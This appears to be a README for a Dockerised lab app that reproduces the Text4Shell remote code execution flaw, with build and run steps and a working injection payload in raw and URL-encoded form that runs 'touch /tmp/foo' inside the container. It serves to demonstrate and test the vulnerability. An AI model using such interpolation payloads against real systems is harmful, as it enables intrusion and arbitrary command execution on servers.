### Install maven - [maven-linux](https://www.digitalocean.com/community/tutorials/install-maven-linux-ubuntu)
-------------


1. Maven install to create the fat jar

```
mvn clean install
```

2. Docker build

```
docker build --tag=text4shell .
```

3. Docker run

```
docker run -p 80:8080 text4shell
```

4. Test the app

```
http://localhost/text4shell/attack?search=<anything>
```

5. Attack can be performed by passing a string “${prefix:name}” where the prefix is the aforementioned lookup:

```
${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}
```

http://localhost/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Ffoo%27%29%7D

6. You can also try using `dns` or `url` prefixes.

7. Get the container id

```
docker container ls
```

8. Get into the app

```
docker exec -it <container_id> bash
```

9. To check if above RCE was successful (You should see a file named `foo` created in the `/tmp` directory):

```
ls /tmp/
```

10. To stop the container

```
docker container stop <container_id>
```# text4shell-docker
# text4shell-docker
